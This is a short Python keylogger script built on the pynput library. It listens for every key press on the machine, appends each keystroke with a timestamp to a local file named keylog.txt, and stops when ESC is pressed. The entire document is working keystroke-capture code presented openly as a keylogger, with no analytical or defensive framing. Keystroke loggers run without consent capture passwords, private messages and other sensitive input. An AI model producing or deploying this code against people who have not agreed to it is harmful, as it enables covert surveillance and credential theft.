from pynput import keyboard
import time

# File to save keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to file with timestamp
def write_to_file(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key}\n")

# Callback function for key press events
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            write_to_file(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Stop keylogger on pressing ESC
def on_release(key):
    if key == keyboard.Key.esc:
        print("[INFO] Stopping keylogger...")
        return False

# Listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
